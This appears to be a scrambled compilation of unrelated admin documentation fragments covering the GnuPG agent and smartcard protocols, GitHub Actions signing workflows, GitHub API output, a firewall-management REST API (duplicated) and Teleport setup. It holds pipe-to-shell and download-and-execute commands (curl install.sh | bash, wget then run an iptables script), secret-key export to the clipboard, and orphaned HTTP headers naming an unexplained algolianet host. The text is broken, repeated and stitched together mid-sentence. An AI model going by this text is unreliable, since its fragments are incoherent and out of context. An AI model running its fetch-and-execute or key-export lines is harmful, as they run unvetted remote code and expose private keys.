C: SIGKEY S: OK key available C: SIGKEY S: OK key available C: PKSIGN S: # I did ask the user whether he really wants to sign S: # I did ask the user for the passphrase S: INQUIRE HASHVAL C: D ABCDEF012345678901234 C: END S: # signature follows S: D (sig-val rsa (s 45435453654612121212)) S: OK GENKEY [--no-protection] [--preset] [<cache_nonce>] +Invokes the key generation process and the server will then inquire on the generation parameters, like: S: INQUIRE KEYPARM C: D (genkey (rsa (nbits 1024))) C: END +The format of the key parameters which depends on the algorithm is of the form: (genkey (algo (parameter_name_1 ....) .... (parameter_name_n ....))) +If everything succeeds, the server returns the public key in a SPKI like S-Expression like this: +

(public-key (rsa (n ) (e ))) +Here is an example session: C: GENKEY S: INQUIRE KEYPARM C: D (genkey (rsa (nbits 1024))) C: END S: D (public-key S: D (rsa (n 326487324683264) (e 10001))) S OK key created ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81> +LISTTRUSTED +GpgAgent returns a list of trusted keys line by line: S: D 000000001234454556565656677878AF2F1ECCFF P S: D 340387563485634856435645634856438576457A P S: D FEDC6532453745367FD83474357495743757435D S S: OK +The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future. +Ok +Finally a client should be able to mark a key as trusted: MARKTRUSTED fingerprint "P"|"S" +The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this: S: INQUIRE TRUSTDESC C: D Do you trust the key with the fingerprint @FPR@ C: D bla fasel blurb. C: END S: OK +GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]]
[--qualitybar] cache_id
[error_message prompt description] +PRESET_PASSPHRASE [--inquire] <Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092

C17D11ADF199F12A30A0910F1F80449BE0B08CB8

Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB> [] + +HAVEKEY keygrips

GET_CONFIRMATION description LEARN [--send] +UPDATESTARTUPTTY +SETDATA hexstring PKSIGN keyid PKSIGN --hash=algoname keyid +READCERT hexified_certid|keyid +READKEY hexified_certid +SETDATA hexstring +d +

PKSIGN keyid LEARN PKSIGN --hash=algoname keyid +WRITEKEY [--force] keyid +WRITEKEY [--force] keyid +PASSWD [--reset] [--nullpin] chvno +CHECKPIN idstr +APDU [--atr] [--more] [--exlen[=n]] [hexstring] +this: + <{Shadowed Card}> & <{Learn}> 'S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1' +--auto-key-import + +command --locate-external-key +command --locate-external-key +github/workflows/release.yml: +ldap://keys.(c7-use-3.algolianet. com) +‘--auto-key-locate

--auto-key-locate +--auto-key-retrieve honor-keyserver-url +-sig-keyserver-url +--recv-key +honor-keyserver-url +--use-agent +--gpg-agent-info + + +--no-random-seed-file +Host: c7-use-3.algolianet. com +Accept:

+gpg-connect-agent /bye +--scdaemon-program filename ++--check-passphrase-pattern file +--check-sym-passphrase-pattern file
+Content-Length: 27 +Connection: keep-alive +Content-Type: application/x-www-form-urlencoded +Sec-Fetch-Dest: empty + +scdaemon.conf +1 +HKCU\Software\GNU\GnuPG:DefaultLogFile, +--debug-level level +HKCU\Software\GNU\GnuPG:DefaultLogFile, +scd-event +HKCU\Software\GNU\GnuPG:HomeDir +HKCU\Software\GNU\GnuPG:DefaultLogFile, +reader_n.status +HKCU\Software\GNU\GnuPG:HomeDir + +trustlist.txt file +gpg-agent.conf +HKCU\Software\GNU\GnuPG:HomeDir +name: release +debug-pinentry +--debug 1024 + +global trustlist (/usr/local/etc/gnupg/trustlist.tx + +Active cards +Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers. +gpg-connect-agent updatestartuptty /bye +Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command: + +gpg-connect-agent /bye +--scdaemon-program filename +Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf +--check-passphrase-pattern file +--check-sym-passphrase-pattern file +Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg) +bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe +Keys listed in the sshcontrol file +--disable-extended-key-format +These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched. + +--enable-ssh-support +--enable-win32-openssh-support +--enable-putty-support + +gpg-connect-agent 'GETINFO s2k_count' /bye +gpg-connect-agent 'GETINFO s2k_time' /bye +To view the auto-calibrated count use: + +gpg-connect-agent 'GETINFO s2k_count_cal' /bye +--ssh-fingerprint-digest +Keys listed in the sshcontrol file + +Active card +gpg-connect-agent /bye +bashrc or whatever initialization file is used for all shell invocations: + +GPG_TTY=$(tty) +export GPG_TTY +--daemon [SIGKEYS & +gpg-card AUTHENTICATE & WRITEKEY & WRITECERT] +server + +agent-program file ¶ +Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs. + +--gpg-program file +Specify a non-default gpg binary to be used by certain commands. + +--gpgsm-program file +Specify a non-default gpgsm binary to be used by certain commands. + +--chuid uid +Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows. + +gpg-card +AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶ +AUTH +FETCH +GENERATE [--force] [--algo=algo{+algo2}] keyref +KDF-SETUP ¶ +Prepare the OpenPGP card KDF feature for this card. + +LANG [--clear] +Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info. + +LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] +NAME [--clear] +PRIVATEDO [--clear] n [< file] file +READCERT [--openpgp] certref > file ¶ +Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3". +URL [--clear] +gpg's. --fetch +WRITECERT certref < file ¶ +WRITECERT --openpgp certref [< file|fpr] +WRITECERT --clear certref

--openpgp +file +fpr. +WRITEKEY [--force] keyref keygrip ¶ +Write a private key object identified by keygrip to the card under the id keyref. +CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶ +Serial number +A hex-string with the serial number of the card. +Type +This gives the type of the card’s application. For example "OpenPGP" or "PIV". + +Keygrip +A hex-string identifying a key. + +Keyref +The application slot where the key is stored on the card. For example "OpenPGP.1" + +Status +The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card. + +YUBIKEY cmd args +Various commands pertaining to Yubikey tokens with cmd being: + +LIST +List supported and enabled Yubikey applications. + +ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] +ENABLE +Enable or disable the specified or all applications on the given interface. + +The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit. + +GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are: + +Authentication key +This is a 24 byte key described by the hex string +010203040506070801020304050607080102030405060708. + +PIV Application PIN +This is the string 123456. + +PIN Unblocking Key +This is the string 12345678. +list (the string gpg/card> +card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: D2760001240102010006090746250000 +Application type .: OpenPGP +Version ..........: 2.1 +[...] +on:

push: tags:

"v*" +permissions:
contents: write +jobs:

release: runs-on: ubuntu-latest steps:

uses: actions/checkout@v3
uses: cli/gh-extension-precompile@v1 with: go_version: "1.16" +Then +- uses: cli/gh-extension-precompile@v1
env: CGO_ENABLED: 1 +- uses: cli/gh-extension-precompile@v1 with: build_script_override: "script/build.sh" +name: release +on:

push: tags:

"v*" +permissions:
contents: write +jobs:

release: runs-on: ubuntu-latest steps:

uses: actions/checkout@v3
id: import_gpg uses: crazy-max/ghaction-import-gpg@v5 with: gpg_private_key: {{ 010203040506070801020304050607080102030405060708 }}
uses: cli/gh-extension-precompile@v1 with: gpg_fingerprint: ${{ 5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81 }} +# macOS +gpg --armor --export-secret-key joe@foo.bar | pbcopy + +# Ubuntu (assuming GNU base64) +gpg --armor --export-secret-key joe@foo.bar -w0 | xclip + +# Arch +gpg --armor --export-secret-key SHA256:Yg4kSqr/z+BsEtXCeN6bSEsVL4LJnCZjYx6dB4Eoxu8= | xclip -selection clipboard -i + +# FreeBSD (assuming BSD base64) +gpg --armor --export-secret-key SHA256:Yg4kSqr/z+BsEtXCeN6bSEsVL4LJnCZjYx6dB4Eoxu8= | xclip + +name: import-gpg + +on:
push: branches: master +jobs:

import-gpg: runs-on: ubuntu-latest steps:

name: Checkout uses: actions/checkout@v4

name: Import GPG key uses: crazy-max/ghaction-import-gpg@v6 with: gpg_private_key: {{ 010203040506070801020304050607080102030405060708 }}

GitHub CLI api

https://cli.github.com/manual/gh_api

gh api
-H "Accept: application/vnd.github+json"
-H "X-GitHub-Api-Version: 2022-11-28"
/

{ "current_user_url": "https://api.github.com/user", "current_user_authorizations_html_url": "https://github.com/settings/connections/applications{/client_id}", "authorizations_url": "https://api.github.com/authorizations", "code_search_url": "https://api.github.com/search/code?q={query}{&page,per_page,sort,order}", "commit_search_url": "https://api.github.com/search/commits?q={query}{&page,per_page,sort,order}", "emails_url": "https://api.github.com/user/emails", "emojis_url": "https://api.github.com/emojis", "events_url": "https://api.github.com/events", "feeds_url": "https://api.github.com/feeds", "followers_url": "https://api.github.com/user/followers", "following_url": "https://api.github.com/user/following{/target}", "gists_url": "https://api.github.com/gists{/gist_id}", "hub_url": "https://api.github.com/hub", "issue_search_url": "https://api.github.com/search/issues?q={query}{&page,per_page,sort,order}", "issues_url": "https://api.github.com/issues", "keys_url": "https://api.github.com/user/keys", "label_search_url": "https://api.github.com/search/labels?q={query}&repository_id={repository_id}{&page,per_page}", "notifications_url": "https://api.github.com/notifications", "organization_url": "https://api.github.com/orgs/{org}", "organization_repositories_url": "https://api.github.com/orgs/{org}/repos{?type,page,per_page,sort}", "organization_teams_url": "https://api.github.com/orgs/{org}/teams", "public_gists_url": "https://api.github.com/gists/public", "rate_limit_url": "https://api.github.com/rate_limit", "repository_url": "https://api.github.com/repos/{owner}/{repo}", "repository_search_url": "https://api.github.com/search/repositories?q={query}{&page,per_page,sort,order}", "current_user_repositories_url": "https://api.github.com/user/repos{?type,page,per_page,sort}", "starred_url": "https://api.github.com/user/starred{/owner}{/repo}", "starred_gists_url": "https://api.github.com/gists/starred", "topic_search_url": "https://api.github.com/search/topics?q={query}{&page,per_page}", "user_url": "https://api.github.com/users/{user}", "user_organizations_url": "https://api.github.com/user/orgs", "user_repositories_url": "https://api.github.com/users/{user}/repos{?type,page,per_page,sort}", "user_search_url": "https://api.github.com/search/users?q={query}{&page,per_page,sort,order}" }

GitHub CLI api

https://cli.github.com/manual/gh_api

gh api
-H "Accept: application/vnd.github+json"
-H "X-GitHub-Api-Version: 2022-11-28"
/meta

{ "verifiable_password_authentication": true, "ssh_key_fingerprints": { "SHA256_RSA": 1234567890, "SHA256_DSA": 1234567890, "SHA256_ECDSA": 1234567890, "SHA256_ED25519": 1234567890 }, "ssh_keys": [ "ssh-ed25519 ABCDEFGHIJKLMNOPQRSTUVWXYZ", "ecdsa-sha2-nistp256 ABCDEFGHIJKLMNOPQRSTUVWXYZ", "ssh-rsa ABCDEFGHIJKLMNOPQRSTUVWXYZ" ], "hooks": [ "192.0.2.1" ], "github_enterprise_importer": [ "192.0.2.1" ], "web": [ "192.0.2.1" ], "api": [ "192.0.2.1" ], "git": [ "192.0.2.1" ], "packages": [ "192.0.2.1" ], "pages": [ "192.0.2.1" ], "importer": [ "192.0.2.1" ], "actions": [ "192.0.2.1" ], "dependabot": [ "192.0.2.1" ], "domains": { "website": [ ".example.com" ], "codespaces": [ ".example.com" ], "copilot": [ ".example.com" ], "packages": [ ".example.com" ] } } Get

GitHub CLI api

https://cli.github.com/manual/gh_api

gh api
-H "Accept: application/vnd.github+json"
-H "X-GitHub-Api-Version: 2022-11-28"
/octocat

MMM. .MMM\n MMMMMMMMMMMMMMMMMMM\n MMMMMMMMMMMMMMMMMMM __________________________________\n MMMMMMMMMMMMMMMMMMMMM | |\n MMMMMMMMMMMMMMMMMMMMMMM | Avoid administrative distraction. |\n MMMMMMMMMMMMMMMMMMMMMMMM | ______________________________|\n MMMM::- -:::::::- -::MMMM |/\n MM~:~ 00~:::::~ 00~:~MM\n .. MMMMM::.00:::+:::.00::MMMMM ..\n .MM::::: .. :::::MM.\n MMMM;:::::;MMMM\n -MM MMMMMMM\n ^ M+ MMMMMMMMM\n MMMMMMM MM MM MM\n MM MM MM MM\n MM MM MM MM\n .MMMMMM~MM.\n ~~~~MM:MM~~~MM:MM~~~~\n ~~~~~~====~~~====~~~~~~\n ~~~~~~========~~~~~~\n :======~==~~\n"

GitHub CLI api

https://cli.github.com/manual/gh_api

gh api
-H "Accept: application/vnd.github+json"
-H "X-GitHub-Api-Version: 2022-11-28"
/versions

GitHub CLI api

https://cli.github.com/manual/gh_api

gh api
-H "Accept: application/vnd.github+json"
-H "X-GitHub-Api-Version: 2022-11-28"
/zen

Request: GET /api/headquarters/config

Response: HTTP 200 {"config" : "<...>"}

Request: POST /api/branch/rules {"name" : "Test01", "from" : "trust", "to" : "untrust", "source" : "10.1.1.1", "destination" : "8.8.8.8", "action" : "allow", "application" : "junos-dns-udp"} Response: HTTP 201 {} Request: DELETE /api/branch1/rules {"name" : "Permit Any"} Response: HTTP 200 {}

Request: PUT /api/branch2/objects/address-group {"name" : "Admin_Servers", "members" : [ "Server02" ] } Response: HTTP 200 {}

Request: PATCH /api/paloalto/headquarters/route {"name" : "internal", "destination" : "10.0.0.0/8", "next-hop" : "172.16.1.2" } Response: HTTP 200 {}

cd /opt git clone https://github.com/videlanicolas/assimilator && cd assimilator ./generate_certificate.sh docker build -t assimilator /opt/assimilator/ docker run -d -p 443:443/tcp assimilator

cd /opt git clone https://github.com/videlanicolas/assimilator && cd assimilator ./generate_certificate.sh sudo ./install.sh

POST /firewalls/argentina HTTP/1.1 Content-Type: application/json Authorization: Basic YWRtaW46c2VjcmV0 { "brand" : , "description" : , #JSON object keys for the Firewall brand ... }

GET /firewalls/argentina HTTP/1.1 Content-Type: application/json Authorization: Basic YWRtaW46c2VjcmV0

GET /firewalls/argentina HTTP/1.1 Content-Type: application/json Authorization: Basic YWRtaW46c2VjcmV0 200 OK The key is the Firewall name through the api, in this example the key is ‘argentina’. Inside this JSON object we have the following keys:

"brand" : The Firewall's brand, this will indicate which translator script should be invoked when connecting to this firewall. "primary" : The Firewall's primary IP address, in PaloAlto this should be the Management IP address. "secondary" : The Firewall's secondary IP address, in PaloAlto this should be the Management IP address. "key" : XML API key to be used by Assimilator when connecting to this PaloAlto Firewall. "description" : Some description about this device.

GET /firewalls/datacenter HTTP/1.1 Content-Type: application/json Authorization: Basic YWRtaW46c2VjcmV0 200 OK The key is the Firewall name through the api, in this example the key is ‘datacenter’. Juniper allows users to login either with a password or a certificate, the latter one is encouraged. Inside this JSON object we have the following keys:

"brand" : The Firewall's brand, this will indicate which translator script should be invoked when connecting to this firewall. "primary" : The Firewall's primary IP address, in Juniper this should be the trust IP address. "secondary" : The Firewall's secondary IP address, in Juniper this should the trust IP address. "user" : The username that Assimilator should use while logging in, it usually is 'assimilator'. "privatekey" : Location of the certificate file to be used for SSH authentication, if not specified then user/password will be used. "privatekeypass" : The password to decrypt the private key from the certificate, if not specified then user/password will be used. "pass" : The password to be used for SSH login, this is used if privatekey and privatekeypass is not specified. "port" : The SSH port on the Firewall, usually 22. "description" : Some description about this device.

GET /api/argentina/config key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json 200 OK Rules

/api//rules

Get all rules in the selected Firewall. This can be filtered with URL arguments.

Example (PaloAlto)

GET /api/argentina/rules key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json 200 OK Example with arguments (PaloAlto)

GET /api/argentina/rules?from=dmz&to=untrust key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json 200 OK To add a rule one simply change the method to POST and sends one of these JSON objects in the body of the request.

POST /api/brasil/rules key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json { "log-end": true, "qos": { "marking": null, "type": null }, "negate-source": false, "disabled": true, "rule-type": "universal", "tag": [], "log-start": false, "hip-profiles": [], "negate-destination": false, "description": null, "category": [ "any" ], "from": [ "dmz" ], "service": [ "any" ], "source": [ "any" ], "destination": [ "10.10.50.2", ], "application": [ "web-browsing", "ssl" ], "profile-setting": null, "log-setting": null, "to": [ "untrust" ], "schedule": null, "source-user": [ "any" ], "icmp-unreachable": false, "name": "Internet access", "disable-server-response-inspection": false, "action": "allow" }

POST /api/brasil/rules key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json { "name" : "Some Rule Name", "source" : { "192.168.1.50", "192.168.1.40" } } To append new objects to a rule use PATCH, here we add objects to destination.

POST /api/brasil/rules key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json { "name" : "Some Rule Name", "destination" : { "100.200.100.10" } } Match

/api//rules/match

A very useful resource is match. With it one can test a source, destination and port to check if the Firewall allows that connection. Many Firewalls already have this funcionality, other don’t (AWS). What they lack is the ease of use. Assimilator only requires source, destination and port (optionally a protocol), other required input by the Firewalls (such as dmz zones) are resolved by Assimilator either through route tables or configuration. If the access is granted then it returns the rule that allows it.

GET /api/uruguay/rules/match?source=192.168.4.5&destination=100.150.100.150&port=443 key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json 200 ok Objects

/api//objects/<address|address-group|service|service-group>

Firewall objects identify hosts and ports in the rules, basically there are four type of objects:

Address: Hosts identified by an IP, IP range, subnet or FQDN. Service: A combination of protocol and source/destination port. Address Group: A group of Address objects. Service Group: A group of service objects. With Assimilator one can create/modify/delete objects easily.

POST /api/chile/objects/address key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json { "name" : "Corp_DNS",

} Request: GET /api/headquarters/config

Response: HTTP 200 {"config" : "<...>"}

Request: POST /api/branch/rules {"name" : "Test01", "from" : "trust", "to" : "untrust", "source" : "10.1.1.1", "destination" : "8.8.8.8", "action" : "allow", "application" : "junos-dns-udp"} Response: HTTP 201 {} Request: DELETE /api/branch1/rules {"name" : "Permit Any"} Response: HTTP 200 {}

Request: PUT /api/branch2/objects/address-group {"name" : "Admin_Servers", "members" : [ "Server02" ] } Response: HTTP 200 {}

Request: PATCH /api/paloalto/headquarters/route {"name" : "internal", "destination" : "10.0.0.0/8", "next-hop" : "172.16.1.2" } Response: HTTP 200 {}

cd /opt git clone https://github.com/videlanicolas/assimilator && cd assimilator ./generate_certificate.sh docker build -t assimilator /opt/assimilator/ docker run -d -p 443:443/tcp assimilator

cd /opt git clone https://github.com/videlanicolas/assimilator && cd assimilator ./generate_certificate.sh sudo ./install.sh

POST /firewalls/argentina HTTP/1.1 Content-Type: application/json Authorization: Basic YWRtaW46c2VjcmV0 { "brand" : , "description" : , #JSON object keys for the Firewall brand ... }

GET /firewalls/argentina HTTP/1.1 Content-Type: application/json Authorization: Basic YWRtaW46c2VjcmV0

GET /firewalls/argentina HTTP/1.1 Content-Type: application/json Authorization: Basic YWRtaW46c2VjcmV0 200 OK The key is the Firewall name through the api, in this example the key is ‘argentina’. Inside this JSON object we have the following keys:

"brand" : The Firewall's brand, this will indicate which translator script should be invoked when connecting to this firewall. "primary" : The Firewall's primary IP address, in PaloAlto this should be the Management IP address. "secondary" : The Firewall's secondary IP address, in PaloAlto this should be the Management IP address. "key" : XML API key to be used by Assimilator when connecting to this PaloAlto Firewall. "description" : Some description about this device.

GET /firewalls/datacenter HTTP/1.1 Content-Type: application/json Authorization: Basic YWRtaW46c2VjcmV0 200 OK The key is the Firewall name through the api, in this example the key is ‘datacenter’. Juniper allows users to login either with a password or a certificate, the latter one is encouraged. Inside this JSON object we have the following keys:

"brand" : The Firewall's brand, this will indicate which translator script should be invoked when connecting to this firewall. "primary" : The Firewall's primary IP address, in Juniper this should be the trust IP address. "secondary" : The Firewall's secondary IP address, in Juniper this should the trust IP address. "user" : The username that Assimilator should use while logging in, it usually is 'assimilator'. "privatekey" : Location of the certificate file to be used for SSH authentication, if not specified then user/password will be used. "privatekeypass" : The password to decrypt the private key from the certificate, if not specified then user/password will be used. "pass" : The password to be used for SSH login, this is used if privatekey and privatekeypass is not specified. "port" : The SSH port on the Firewall, usually 22. "description" : Some description about this device.

GET /api/argentina/config key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json 200 OK Rules

/api//rules

Get all rules in the selected Firewall. This can be filtered with URL arguments.

Example (PaloAlto)

GET /api/argentina/rules key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json 200 OK Example with arguments (PaloAlto)

GET /api/argentina/rules?from=dmz&to=untrust key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json 200 OK To add a rule one simply change the method to POST and sends one of these JSON objects in the body of the request.

POST /api/brasil/rules key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json { "log-end": true, "qos": { "marking": null, "type": null }, "negate-source": false, "disabled": true, "rule-type": "universal", "tag": [], "log-start": false, "hip-profiles": [], "negate-destination": false, "description": null, "category": [ "any" ], "from": [ "dmz" ], "service": [ "any" ], "source": [ "any" ], "destination": [ "10.10.50.2", ], "application": [ "web-browsing", "ssl" ], "profile-setting": null, "log-setting": null, "to": [ "untrust" ], "schedule": null, "source-user": [ "any" ], "icmp-unreachable": false, "name": "Internet access", "disable-server-response-inspection": false, "action": "allow" }

POST /api/brasil/rules key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json { "name" : "Some Rule Name", "source" : { "192.168.1.50", "192.168.1.40" } } To append new objects to a rule use PATCH, here we add objects to destination.

POST /api/brasil/rules key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json { "name" : "Some Rule Name", "destination" : { "100.200.100.10" } } Match

/api//rules/match

A very useful resource is match. With it one can test a source, destination and port to check if the Firewall allows that connection. Many Firewalls already have this funcionality, other don’t (AWS). What they lack is the ease of use. Assimilator only requires source, destination and port (optionally a protocol), other required input by the Firewalls (such as dmz zones) are resolved by Assimilator either through route tables or configuration. If the access is granted then it returns the rule that allows it.

GET /api/uruguay/rules/match?source=192.168.4.5&destination=100.150.100.150&port=443 key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json 200 ok Objects

/api//objects/<address|address-group|service|service-group>

Firewall objects identify hosts and ports in the rules, basically there are four type of objects:

Address: Hosts identified by an IP, IP range, subnet or FQDN. Service: A combination of protocol and source/destination port. Address Group: A group of Address objects. Service Group: A group of service objects. With Assimilator one can create/modify/delete objects easily.

POST /api/chile/objects/address key: BDP0NyHZMDfz98kcmD3GuBIQGW9EZTgWGPf56dWnkD3LGM3dZPaZICrKVnTnQWh5YdGLh5SJ9ktg7ReR4le94zyxdigdLTHHf8s Content-Type: application/json { "name" : "Corp_DNS",

}

$ portal open 80 Forwarding: portals.rs:39755 -> 127.0.0.1:80

$ portal open 8888 192.168.0.1:3306 # Opens multiple tunnel at once Forwarding: portals.rs:41657 -> 192.168.0.1:3306 Forwarding: portals.rs:38913 -> 127.0.0.1:8888

$ portal open 8000:8000 # Specifies the remote port (may fail if it's in use) Forwarding: portals.rs:8000 -> 127.0.0.1:8000

           GNU LESSER GENERAL PUBLIC LICENSE
               Version 3, 29 June 2007
Convey the Minimal Corresponding Source under the terms of this License, and the Corresponding Application Code in a form suitable for, and under terms that permit, the user to recombine or relink the Application with a modified version of the Linked Version to produce a modified Combined Work, in the manner specified by section 6 of the GNU GPL for conveying Corresponding Source.

Use a suitable shared library mechanism for linking with the Library. A suitable mechanism is one that (a) uses at run time a copy of the Library already present on the user's computer system, and (b) will operate properly with a modified version of the Library that is interface-compatible with the Linked Version. wget https://github.com/LasVegasCoder/FireWALL/blob/master/princeserverguard.ipt

chmod +x princeserverguard.ipt

./princeserverguard.ipt

Then watch your traffic with: watch -d -n1 iptables -vnL

make -C build.assets build-binaries

git clone https://github.com/gravitational/teleport.git cd teleport

make full

make build/tsh TOUCHID=yes

make build/tsh FIDO2=dynamic

export PKG_CONFIG_PATH="$(brew --prefix openssl@3)/lib/pkgconfig" make build/tsh FIDO2=dynamic

sudo mkdir -p -m0700 /var/lib/teleport sudo chown $USER /var/lib/teleport

go install github.com/githubnemo/CompileDaemon@latest

make teleport-hot-reload

make teleport-hot-reload TELEPORT_ARGS='start --config=/path/to/config.yaml'

make docker-ui

Run Teleport as a single-node cluster in development mode:

DEBUG=1 ./build/teleport start -d

go get github.com/new/dependency

go get github.com/new/dependency@version

go get -u github.com/new/dependency

go get -u all

tctl version

Teleport v15.0.1 git:api/14.0.0-gd1e081e go1.21

tsh version Teleport v15.0.1 go1.21 Proxy version: 15.0.1 Proxy: teleport.example.com

tsh login --proxy= teleport.example.com --user= email@example.com tctl status Cluster teleport.example.com Version 15.0.1 CA pin sha256:abdc1245efgh5678abdc1245efgh5678abdc1245efgh5678abdc1245efgh5678

kubectl config get-contexts

CONTEXT_NAME=context-name kubectl config use-context ${CONTEXT_NAME?}

curl -OL
https://raw.githubusercontent.com/gravitational/teleport/v15.0.1/examples/k8s-auth/get-kubeconfig.sh

$ bash get-kubeconfig.sh The script is successful if you see this message:

Done!

tctl tokens add --type=kube --format=text --ttl=1h

echo join-token | sudo tee /tmp/token

curl https://goteleport.com/static/install.sh | bash -s 15.0.1 version: v3 teleport: join_params: token_name: "/tmp/token" method: token proxy_server: teleport.example.com:443 auth_service: enabled: off proxy_service: enabled: off ssh_service: enabled: off kubernetes_service: enabled: "yes" kubeconfig_file: "/var/lib/teleport/kubeconfig" labels: "region": "us-east1"

sudo systemctl enable teleport sudo systemctl start teleport

kubectl config view
-o jsonpath="{.contexts[?(@.name=="$(kubectl config current-context)")].context.user}"

kind: role metadata: name: kube-access version: v7 spec: allow: kubernetes_labels: '': '' kubernetes_resources: - kind: '' namespace: '' name: '' verbs: [''] kubernetes_groups: - viewers kubernetes_users: # Replace USER with the Kubernetes user for your current context. - USER deny: {}

tctl create -f kube-access.yaml

tctl get github/github --with-secrets > github.yaml

teams_to_roles: - organization: octocats team: admins roles: - access

  - kube-access
Apply your changes:

tctl create -f github.yaml

apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: viewers-crb subjects:

kind: Group
Bind the group "viewers", corresponding to the kubernetes_groups we assigned our "kube-access" role above

name: viewers apiGroup: rbac.authorization.k8s.io roleRef: kind: ClusterRole
